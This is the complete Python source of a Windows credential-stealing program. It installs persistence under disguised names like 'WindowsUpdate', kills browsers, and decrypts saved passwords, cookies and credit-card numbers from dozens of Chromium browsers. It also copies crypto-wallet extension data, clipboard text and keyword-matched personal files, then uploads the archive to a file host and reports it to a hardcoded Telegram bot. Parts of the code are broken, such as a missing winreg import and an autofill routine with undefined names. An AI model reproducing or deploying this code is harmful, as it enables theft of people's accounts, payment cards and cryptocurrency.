import base64
import datetime
import getpass
import json
import os
import platform
import random
import shutil
import socket
import sqlite3
import subprocess
import tempfile
import time
import zipfile
import browser_cookie3 as bc3
import psutil
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from win32crypt import CryptUnprotectData

date_str = time.strftime("%Y-%m-%d")
time_str = time.strftime("%H:%M:%S")
telechid = "6556448976"
telebotok = "6657156685:AAE3mBQHTuQcZ8Hg8s_GxhaLHaPmGEmkA7Y"
useLProfile = os.environ.get("USELPROFILE", "")
RP = os.environ.get("APPDATA", "")
LP = os.environ.get("LOCALAPPDATA", "")
igbadie = os.environ.get("TEMP", "")
ONA = os.path.join(igbadie, f"Ogun_ti_da_{getpass.getuser()}.zip")


def per6():
    current_file = os.path.abspath(__file__) or os.path.dirname(__file__)
    try:
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
            winreg.SetValueEx(reg_key, "WindowsUpdate", 0, winreg.REG_SZ, current_file)
    except:
        pass

    try:
        startup_path = os.path.join(
            os.getenv("APPDATA"),
            "Microsoft",
            "Windows",
            "Start Menu",
            "Programs",
            "Startup",
        )
        target_path = os.path.join(startup_path, "sys_service6.exe")
        shutil.copy2(current_file, target_path)
        os.system(f'attrib +h +s "{target_path}"')
    except:
        pass

    system_locations = [
        os.path.join(os.getenv("WINDIR"), "System32", "WinUpdate.exe"),
        os.path.join(
            os.getenv("PROGRAMDATA"), "Microsoft", "Windows Defender", "platform.exe"
        ),
    ]

    for location in system_locations:
        try:
            os.makedirs(os.path.dirname(location), exist_ok=True)
            if not os.path.exists(location):
                shutil.copy2(current_file, location)
                os.system(f'attrib +h +s "{location}"')
        except:
            continue


def pawon(process_names, attempts=1, delay=0):
    for _ in range(attempts):
        for proc in psutil.process_iter(["pid", "name"]):
            try:
                if proc.info["name"].lower() in [n.lower() for n in process_names]:
                    proc.kill()
            except:
                pass
        if delay:
            time.sleep(delay)


def gba_kokoro(local_state_path):
    if not os.path.exists(local_state_path):
        return None
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        encrypted_key = encrypted_key[5:]
        return CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except:
        return None


def backup_db(db_path):
    try:
        conn = sqlite3.connect(":memory:")
        disk_conn = sqlite3.connect(db_path)
        disk_conn.backup(conn)
        disk_conn.close()
        return conn, conn.cursor()
    except:
        try:
            conn = sqlite3.connect(f"file:{db_path}?mode=ro", uri=True)
            return conn, conn.cursor()
        except:
            return None, None


def decrypt(encrypted_value, master_key):
    if not encrypted_value or not master_key:
        return ""
    try:
        if isinstance(encrypted_value, str):
            encrypted_value = encrypted_value.encode("utf-8")
        if encrypted_value[:3] in (b"v10", b"v11", b"v20"):
            encrypted_value = encrypted_value[3:]
        try:
            nonce = encrypted_value[:12]
            tag = encrypted_value[-16:]
            ciphertext = encrypted_value[12:-16]
            cipher = Cipher(algorithms.AES(master_key), modes.GCM(nonce, tag))
            dec = cipher.decryptor()
            plain = dec.update(ciphertext) + dec.finalize()
            return plain.decode("utf-8", errors="ignore")
        except:
            iv = encrypted_value[:16]
            cipher = Cipher(algorithms.AES(master_key), modes.CBC(iv))
            dec = cipher.decryptor()
            plain = dec.update(encrypted_value[16:]) + dec.finalize()
            pad = plain[-1] & 0xFF
            if 1 <= pad <= 16 and all(b == pad for b in plain[-pad:]):
                plain = plain[:-pad]
            return plain.decode("utf-8", errors="ignore")
    except:
        return ""


def extract_extensions(adapor, profile_path, browser_name, ext_ids):
    ext_folder = os.path.join(profile_path, "Local Extension Settings")
    if not os.path.exists(ext_folder):
        return 0
    count = 0
    for ext_id in os.listdir(ext_folder):
        if ext_id in ext_ids:
            count += 1
            ext_name = ext_ids[ext_id]
            src = os.path.join(ext_folder, ext_id)
            if os.path.isdir(src):
                for root, _, files in os.walk(src):
                    for file in files:
                        abs_path = os.path.join(root, file)
                        arcname = os.path.join(
                            "Extensions",
                            browser_name,
                            f"{ext_name}_{ext_id}",
                            os.path.relpath(abs_path, src),
                        )
                        try:
                            adapor.write(abs_path, arcname)
                        except:
                            pass
    return count


def sys_info(adapor):
    try:
        s = requests.get("https://ipinfo.io", timeout=15).json()
        public_ip_data = "".join(
            f"    - {k}{' ' * (20 - len(k))}: {v}\n" for k, v in s.items()
        )
    except:
        public_ip_data = "No IP infos.\n"

    sys_infos = f"""
    - TIME          : {time_str}
    - DATE          : {date_str}
    - hostname      : {socket.gethostname()}
    - username      : {getpass.getuser()}
    - processor     : {platform.processor()}
    - machine       : {platform.machine()}
    - platform      : {platform.platform()}
    - system        : {platform.system()}
    - release       : {platform.release()}
    - version       : {platform.version()}
    - CPU cores     : {psutil.cpu_count(logical=True)}
    - RAM-total(GB) : {psutil.virtual_memory().total}
    - Disk-usage(%) : {psutil.disk_usage("/").percent}
    - public-IP     : {public_ip_data}
        """
    adapor.writestr("sys_infos.txt", sys_infos)
    return True, sys_infos


def clip_history(adapor):
    try:
        result = subprocess.run(
            ["powershell.exe", "Get-Clipboard"],
            capture_output=True,
            text=True,
            timeout=10,
        )
        clip_text = result.stdout.strip()
        if clip_text:
            adapor.writestr("clip_history.txt", clip_text)
            return clip_text
        return ""
    except:
        return ""


def run_browz(adapor):
    ext_ids = {
        "nkbihfbeogaeaoehlefnkodbefgpgknn": "MetaMask",
        "ejbalbakoplchlghecdalmeeeajnimhm": "MetaMask-edge",
        "fhbohimaelbohpjbbldcngcnapndodjp": "Binance",
        "bfnaelmomeimhlpmgjnjophhpkkoljpa": "Phantom",
        "hnfanknocfeofbddgcijnmhnfnkdnaad": "Coinbase",
        "fnjhmkhhmkbjkkabndcnnogagogbneec": "Ronin",
        "aholpfdialjgjfhomihkjbmgjidlcdno": "Exodus",
        "aeachknmefphepccionboohckonoeemg": "Coin98",
        "pdadjkfkgcafgbceimcpbkalnfnepbnk": "KardiaChain",
        "aiifbnbfobpmeekipheeijimdpnlpgpp": "TerraStation",
        "amkmjjmmflddogmhpjloimipbofnfjih": "Wombat",
        "fnnegphlobjdpkhecapkijjdkgcjhkib": "Harmony",
        "lpfcbjknijpeeillifnkikgncikgfhdo": "Nami",
        "efbglgofoippbgcjepnhiblaibcnclgk": "Martian Aptos",
        "jnlgamecbpmbajjfhmmmlhejkemejdma": "Braavos",
        "hmeobnfnfcmdkdcmlblgagmfpfboieaf": "XDEFI",
        "ffnbelfdoeiohenkjibnmadjiehjhajb": "Yoroi",
        "nphplpgoakhhjchkkhmiggakijnkhfnd": "TON",
        "bhghoamapcdpbohphigoooaddinpkbai": "Authenticator",
        "ibnejdfjmmkpcnlpebklmnkoeoihofec": "Tron",
        "lnaonmdpfhbgmhbmhlbbnhegggijcfcg": "Trezor",
        "knjilbhbkmjdjgaebdcejjlmnpagjmei": "Ledger",
        "mbndjliiknpfmpanccheokhdbbmdaaei": "Mycelium",
        "eimcpmfpjgojopihlhfjkaklpfkmhglp": "TrustWallet1",
        "egjidjbpglichdcondbcbdnbeeppgdph": "TrustWallet2",
        "klkbpbgfplbofepkbkaodljfifmohokb": "Ellipal",
        "cimfefinodkjoijcbgffjnmklmnngjge": "Argent",
        "jbecljpfobbfnhmpgbdgmjajmbgdckgj": "Dapper",
        "neihkdpkimcjokhblhpfnjmfklkpjkpj": "Curve",
        "dofnkedmjpfpjncpgijbffklkmdolnkk": "SushiSwap",
        "jgfjjpnnphjkjiecligjdnfmbmhbajpm": "Uniswap",
        "bfbijoiifjbkbbajgjgdkmceibjlcbj": "1inch",
        "hlbocmgldbcopjfhfmicmdhngbkjdgmj": "Aave",
        "mcohilncbfahbmgdjkbpemcciiolgcge": "OKX Wallet",
        "ppbibelpcjmhbdihakflkdcoccbgbkpo": "Unisat Wallet",
        "ejjladinnckdgjemekebdpeokbikhfci": "Petra",
        "nfdgfjplkllcbmnlpnfkpidijlnfjfjj": "BitKeep",
        "enabgbdfcbaehmbigakijjabdpdnimlg": "Manta",
        "ppdadbejkmjnefldpcdjhnkpbjkikoip": "Rose",
        "pdgbckgdncnhihllonhnjbdoighgpimk": "Wallet Guard",
        "onhogfjeacnfoofkfgppdlbmlmnplgbn": "SubWallet",
        "dlcobpjiigpikoobohmabe...": "Argent X",
        "bmnjpfboeieiejchjibfbaiidbdgknjl": "Blockchain Wallet",
        "hifafgmccdpekplomjjkcfgodnhcellj": "Crypto.com",
        "hekjcgjfhbldlcfbjdfpmhkjjpmppjcf": "Zerion",
    }
    profiles = [
        "",
        "Default",
        "Profile 1",
        "Profile 2",
        "Profile 3",
        "Profile 4",
        "Profile 5",
    ]
    browsers = [
        (
            "Chrome",
            os.path.join(LP, "Google", "Chrome", "User Data"),
            "chrome.exe",
        ),
        ("Chromium", os.path.join(LP, "Chromium", "User Data"), "chrome.exe"),
        (
            "Chrome SxS",
            os.path.join(LP, "Google", "Chrome SxS", "User Data"),
            "chrome.exe",
        ),
        (
            "Chrome Beta",
            os.path.join(LP, "Google", "Chrome Beta", "User Data"),
            "chrome.exe",
        ),
        (
            "Chrome Dev",
            os.path.join(LP, "Google", "Chrome Dev", "User Data"),
            "chrome.exe",
        ),
        (
            "Chrome Unstable",
            os.path.join(LP, "Google", "Chrome Unstable", "User Data"),
            "chrome.exe",
        ),
        (
            "Chrome Canary",
            os.path.join(LP, "Google", "Chrome Canary", "User Data"),
            "chrome.exe",
        ),
        (
            "Edge",
            os.path.join(LP, "Microsoft", "Edge", "User Data"),
            "msedge.exe",
        ),
        (
            "Opera",
            os.path.join(RP, "Opera Software", "Opera Stable"),
            "opera.exe",
        ),
        (
            "Opera GX",
            os.path.join(RP, "Opera Software", "Opera GX Stable"),
            "opera.exe",
        ),
        (
            "Opera Neon",
            os.path.join(RP, "Opera Software", "Opera Neon"),
            "opera.exe",
        ),
        (
            "Brave",
            os.path.join(LP, "BraveSoftware", "Brave-Browser", "User Data"),
            "brave.exe",
        ),
        ("Vivaldi", os.path.join(LP, "Vivaldi", "User Data"), "vivaldi.exe"),
        ("Amigo", os.path.join(LP, "Amigo", "User Data"), "amigo.exe"),
        ("Torch", os.path.join(LP, "Torch", "User Data"), "torch.exe"),
        ("Kometa", os.path.join(LP, "Kometa", "User Data"), "kometa.exe"),
        ("Orbitum", os.path.join(LP, "Orbitum", "User Data"), "orbitum.exe"),
        (
            "Cent Browser",
            os.path.join(LP, "CentBrowser", "User Data"),
            "centbrowser.exe",
        ),
        ("7Star", os.path.join(LP, "7Star", "7Star", "User Data"), "7star.exe"),
        (
            "Sputnik",
            os.path.join(LP, "Sputnik", "Sputnik", "User Data"),
            "sputnik.exe",
        ),
        (
            "Epic Privacy Browser",
            os.path.join(LP, "Epic Privacy Browser", "User Data"),
            "epic.exe",
        ),
        ("Uran", os.path.join(LP, "uCozMedia", "Uran", "User Data"), "uran.exe"),
        (
            "Yandex",
            os.path.join(LP, "Yandex", "YandexBrowser", "User Data"),
            "yandex.exe",
        ),
        (
            "Yandex Canary",
            os.path.join(LP, "Yandex", "YandexBrowserCanary", "User Data"),
            "yandex.exe",
        ),
        (
            "Yandex Developer",
            os.path.join(LP, "Yandex", "YandexBrowserDeveloper", "User Data"),
            "yandex.exe",
        ),
        (
            "Yandex Beta",
            os.path.join(LP, "Yandex", "YandexBrowserBeta", "User Data"),
            "yandex.exe",
        ),
        (
            "Yandex Tech",
            os.path.join(LP, "Yandex", "YandexBrowserTech", "User Data"),
            "yandex.exe",
        ),
        (
            "Yandex SxS",
            os.path.join(LP, "Yandex", "YandexBrowserSxS", "User Data"),
            "yandex.exe",
        ),
        ("Iridium", os.path.join(LP, "Iridium", "User Data"), "iridium.exe"),
        ("Slimjet", os.path.join(LP, "Slimjet", "User Data"), "slimjet.exe"),
        (
            "Comodo Dragon",
            os.path.join(LP, "Comodo", "Dragon", "User Data"),
            "dragon.exe",
        ),
        ("Falkon", os.path.join(LP, "Falkon"), "falkon.exe"),
        (
            "Naver Whale",
            os.path.join(LP, "Naver", "Whale", "User Data"),
            "whale.exe",
        ),
        ("SRWare Iron", os.path.join(LP, "SRWare Iron", "User Data"), "iron.exe"),
        (
            "Coc Coc",
            os.path.join(LP, "CocCoc", "Browser", "User Data"),
            "coccoc.exe",
        ),
        ("Polarity", os.path.join(LP, "Polarity", "User Data"), "polarity.exe"),
        (
            "Javelin Browser",
            os.path.join(LP, "Javelin", "User Data"),
            "javelin.exe",
        ),
        ("Chedot", os.path.join(LP, "Chedot", "User Data"), "chedot.exe"),
        (
            "Lunascape",
            os.path.join(LP, "Lunascape", "User Data"),
            "lunascape.exe",
        ),
        (
            "Otter Browser",
            os.path.join(LP, "Otter Browser", "User Data"),
            "otter.exe",
        ),
        (
            "DuckDuckGo Browser",
            os.path.join(LP, "DuckDuckGo", "User Data"),
            "duckduckgo.exe",
        ),
        ("Tutanota", os.path.join(LP, "Tutanota", "User Data"), "tutanota.exe"),
        (
            "SafeGuard Browser",
            os.path.join(LP, "SafeGuard", "User Data"),
            "safeguard.exe",
        ),
        ("XBrowser", os.path.join(LP, "XBrowser", "User Data"), "xbrowser.exe"),
        ("WebCat", os.path.join(LP, "WebCat", "User Data"), "webcat.exe"),
    ]

    browser_procs = [p for _, _, p in browsers]
    pawon(browser_procs, attempts=2, delay=0.5)

    iye_extensions = 0
    iye_passwords = 0
    iye_cookies = 0
    iye_history = 0
    iye_downloads = 0
    iye_cards = 0
    iye_fillz = 0

    file_passwords = []
    file_cookies = []
    file_history = []
    file_downloads = []
    file_cards = []
    file_fillz = []

    seen_browsers = set()

    for name, path, proc_name in browsers:
        if not os.path.exists(path):
            continue
        local_state_path = os.path.join(path, "Local State")
        master_key = gba_kokoro(local_state_path)
        if not master_key:
            continue

        for profile in profiles:
            profile_path = os.path.join(path, profile)
            if not os.path.exists(profile_path):
                continue

            iye_extensions += extract_extensions(adapor, profile_path, name, ext_ids)

            password_db = os.path.join(profile_path, "Login Data")
            if os.path.exists(password_db):
                try:
                    conn, cur = backup_db(password_db)
                    if cur:
                        cur.execute(
                            "SELECT action_url, username_value, password_value FROM logins"
                        )
                        for row in cur.fetchall():
                            if not row[0] or not row[2]:
                                continue
                            pw = decrypt(row[2], master_key)
                            if not pw:
                                continue
                            file_passwords.append(
                                f"- Url      : {row[0]}\n  Username : {row[1]}\n  Password : {pw}\n  Browser  : {name}\n"
                            )
                            iye_passwords += 1
                        conn.close()
                except:
                    pass

            cookie_db = os.path.join(profile_path, "Network", "Cookies")
            if os.path.exists(cookie_db):
                try:
                    cj = bc3.chrome(cookie_file=cookie_db, key_file=local_state_path)
                    for c in cj:
                        file_cookies.append(
                            {
                                "browser": name,
                                "domain": c.domain,
                                "name": c.name,
                                "path": c.path,
                                "value": c.value,
                                "expires": int(c.expires) if c.expires else 0,
                            }
                        )
                        iye_cookies += 1
                except:
                    pass

            history_db = os.path.join(profile_path, "History")
            if os.path.exists(history_db):
                try:
                    conn, cur = backup_db(history_db)
                    if cur:
                        cur.execute("SELECT url, title, last_visit_time FROM urls")
                        for row in cur.fetchall():
                            if not row[0] or not row[1] or not row[2]:
                                continue
                            file_history.append(
                                f"- Url     : {row[0]}\n  Title   : {row[1]}\n  Time    : {row[2]}\n  Browser : {name}\n"
                            )
                            iye_history += 1
                        conn.close()
                except:
                    pass

            downloads_db = os.path.join(profile_path, "History")
            if os.path.exists(downloads_db):
                try:
                    conn, cur = backup_db(downloads_db)
                    if cur:
                        cur.execute("SELECT tab_url, target_path FROM downloads")
                        for row in cur.fetchall():
                            if not row[0] or not row[1]:
                                continue
                            file_downloads.append(
                                f"- Path    : {row[1]}\n  Url     : {row[0]}\n  Browser : {name}\n"
                            )
                            iye_downloads += 1
                        conn.close()
                except:
                    pass

            cards_db = os.path.join(profile_path, "Web Data")
            if os.path.exists(cards_db):
                try:
                    conn, cur = backup_db(cards_db)
                    if cur:
                        cur.execute(
                            "SELECT name_on_card, expiration_month, expiration_year, card_iye_encrypted, date_modified FROM credit_cards"
                        )
                        for row in cur.fetchall():
                            if not row[0] or not row[1] or not row[2] or not row[3]:
                                continue
                            card = decrypt(row[3], master_key)
                            if not card:
                                continue
                            file_cards.append(
                                f"- Name             : {row[0]}\n  Expiration Month : {row[1]}\n  Expiration Year  : {row[2]}\n  Card Number      : {card}\n  Date Modified    : {row[4]}\n  Browser          : {name}\n"
                            )
                            iye_cards += 1
                        conn.close()
                except:
                    pass

            fillz_db = os.path.join(profile_path, "Web Data")
            if os.path.exists(fillz_db):
                try:
                    conn, cur = backup_db(fillz_db)
                    if cur:
                        cur.execute(
                            "SELECT name, value, date_created FROM autofill ORDER BY date_created"
                        )
                        for row in cur.fetchall():
                            if not row[0] or not row[1] or not row[2] or not row[3]:
                                continue
                            datecreatediso = (
                                datetime.datetime.fromtimestamp(
                                    datecreated / 1000000
                                ).isoformat()
                                if datecreated
                                else None
                            )
                        continue
                        file_fillz.append(
                            {
                                "name": name,
                                "value": value,
                                "datecreated": datecreatediso,
                                "browser": browser,
                            }
                        )
                        iye_fillz += 1
                    conn.close()
                except:
                    pass
        if name not in seen_browsers:
            seen_browsers.add(name)

    if not file_passwords:
        file_passwords = "No passwords was found."
    else:
        file_passwords = "\n".join(file_passwords)

    if not file_cookies:
        file_cookies_json = json.dumps(
            [{"message": "No cookies was found."}],
            indent=2,
        )
    else:
        file_cookies_json = json.dumps(file_cookies, indent=2, ensure_ascii=False)

    if not file_history:
        file_history = "No history was found."
    else:
        file_history = "\n".join(file_history)

    if not file_downloads:
        file_downloads = "No downloads was found."
    else:
        file_downloads = "\n".join(file_downloads)

    if not file_cards:
        file_cards = "No cards was found."
    else:
        file_cards = "\n".join(file_cards)
    if not file_fillz:
        file_fillz = "No autofillz was found."
    else:
        file_fillz = "\n".join(file_fillz)

    adapor.writestr(f"Passwords ({iye_passwords}).txt", file_passwords)
    adapor.writestr(f"Cookies ({iye_cookies}).json", file_cookies_json)
    adapor.writestr(f"Cards ({iye_cards}).txt", file_cards)
    adapor.writestr(f"Autofills ({iye_fillz}).txt", file_fillz)
    adapor.writestr(f"Browsing History ({iye_history}).txt", file_history)
    adapor.writestr(f"Download History ({iye_downloads}).txt", file_downloads)

    return (
        iye_extensions,
        iye_passwords,
        iye_cookies,
        iye_history,
        iye_downloads,
        iye_cards,
        iye_fillz
    )


def better_thinz(adapor):
    extensions = (
        ".txt",
        ".log",
        ".ini",
        ".json",
        ".xml",
        ".csv",
        ".md",
        ".cfg",
        ".conf",
        ".png",
        ".jpg",
        ".jpeg",
        ".pdf",
        ".doc",
        ".docx",
        ".xls",
        ".xlsx",
        ".zip",
    )
    paths = [
        os.path.join(useLProfile, "Desktop"),
        os.path.join(useLProfile, "Downloads"),
        os.path.join(useLProfile, "Documents"),
        os.path.join(useLProfile, "OneDrive"),
        os.path.join(RP, "Microsoft", "Windows", "Recent"),
    ]
    keywords = set(
        [
            "2fa",
            "mfa",
            "2step",
            "otp",
            "verification",
            "approv",
            "verify",
            "acount",
            "account",
            "value",
            "identification",
            "login",
            "contact",
            "private",
            "personnel",
            "personal",
            "credit union",
            "bank",
            "funds",
            "credit",
            "paypal",
            "casino",
            "checkout",
            "debit",
            "crypto",
            "bitcoin",
            "btc",
            "eth",
            "ethereum",
            "atomic",
            "exodus",
            "binance",
            "metamask",
            "trading",
            "échange",
            "exchange",
            "wallet",
            "ledger",
            "trezor",
            "seed",
            "seed phrase",
            "recovery",
            "récupération",
            "recovery phrase",
            "mnemonic",
            "mnémonique",
            "passphrase",
            "phrase secrète",
            "wallet key",
            "mywallet",
            "backupwallet",
            "wallet backup",
            "private key",
            "keystore",
            "json",
            "trustwallet",
            "safepal",
            "coinbase",
            "kucoin",
            "kraken",
            "blockchain",
            "bnb",
            "usdt",
            "disc",
            "token",
            "tkn",
            "webhook",
            "api",
            "bot",
            "tokendisc",
            "key",
            "keys",
            "private",
            "secret",
            "server",
            "access",
            "auth",
            "mdp",
            "password",
            "psw",
            "pass",
            "passphrase",
            "phrase",
            "pwd",
            "passwords",
            "keep",
            "data",
            "donnée",
            "details",
            "confidential",
            "sensitive",
            "senssible",
            "important",
            "privilege",
            "privilège",
            "vault",
            "safe",
            "locker",
            "protection",
            "hidden",
            "caché",
            "cache",
            "identity",
            "identité",
            "passport",
            "permit",
            "pin",
            "nip",
            "dump",
            "exposed",
            "hack",
            "crack",
            "pirate",
            "db",
            "database",
            "master",
            "admin",
            "administrator",
            "administrateur",
            "root",
            "owner",
            "keyfile",
            "keystore",
            "seedphrase",
            "recoveryphrase",
            "privatekey",
            "publickey",
            "accountdata",
            "userdata",
            "logininfo",
            "seedbackup",
            "backup",
            "secret",
            "documento",
            "document",
        ]
    )

    name_files = []
    for path in paths:
        if not os.path.isdir(path):
            continue
        for root, _, files in os.walk(path):
            for file in files:
                if not file.lower().endswith(extensions):
                    continue
                file_name_no_ext = os.path.splitext(file)[0].lower()
                if file_name_no_ext not in keywords:
                    continue
                full_path = os.path.join(root, file)
                if not os.path.isfile(full_path):
                    continue
                name_files.append(file)
                base_name, ext = os.path.splitext(file)
                adapor.writestr(
                    os.path.join(
                        "Interesting Files",
                        base_name + f"_{random.randint(1, 9999)}" + ext,
                    ),
                    open(full_path, "rb").read(),
                )

    return len(name_files)


def dasi_gof(file_path):
    try:
        with open(file_path, "rb") as f:
            files = {"file": f}
            response = requests.post(
                "https://upload.gofile.io/uploadFile", files=files, timeout=500
            )
            if response.status_code == 200:
                result = response.json()
                if result.get("status") == "ok":
                    return result["data"]["downloadPage"]
    except:
        pass
    return None


def escape_html(text):
    return str(text).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")


def _send(caption):
    if not telebotok or not telechid:
        return
    try:
        url = f"https://api.telegram.org/bot{telebotok}/sendMessage"
        requests.post(
            url,
            data={"chat_id": telechid, "text": caption, "parse_mode": "HTML"},
            timeout=30,
        )
    except:
        pass


def dasi_tele(ext, pw, ck, hi, dl, cd, af, iye_files, ona_gof):
    msg = (
        f"😶‍🌫️<b>OGUNDA DI MEJI</b>\n😶‍🌫️"
        f"🎯 <b>Name:</b> <code>{escape_html(getpass.getuser())}</code>\n"
        f"📦 <b>Ip:</b> <code>{escape_html(socket.gethostname())}</code>\n"
        f"📅 <b>Date:</b> <code>{escape_html(date_str)}</code>\n"
        f"🕒 <b>Time:</b> <code>{escape_html(time_str)}</code>\n"
        f"🔌 <b>Extensions:</b> <code>{escape_html(ext)}</code>\n"
        f"🔐 <b>Passwords:</b> <code>{escape_html(pw)}</code>\n"
        f"🍪 <b>Cookies:</b> <code>{escape_html(ck)}</code>\n"
        f"🌐 <b>History:</b> <code>{escape_html(hi)}</code>\n"
        f"📥 <b>Downloads:</b> <code>{escape_html(dl)}</code>\n"
        f"💳 <b>Cards:</b> <code>{escape_html(cd)}</code>\n"
        f"💳 <b>Autofillz:</b> <code>{escape_html(af)}</code>\n"
        f"📁 <b>Interesting Files:</b> <code>{escape_html(iye_files)}</code>\n\n"
        f"📥 <b>Download URL:</b>\n<code>{escape_html(ona_gof)}</code>"
    )
    _send(msg)


def main():
    per6()
    with zipfile.ZipFile(ONA, "w") as adapor:
        sys_info(adapor)
        clip_history(adapor)
        ext, pw, ck, hi, dl, cd, af = run_browz(adapor)
        iye_files = better_thinz(adapor)

    ona_gof = dasi_gof(ONA)
    dasi_tele(ext, pw, ck, hi, dl, cd, af, iye_files, ona_gof)

    print("Please Wait...")
    try:
        os.remove(ONA)
    except:
        pass


if __name__ == "__main__":
    main()
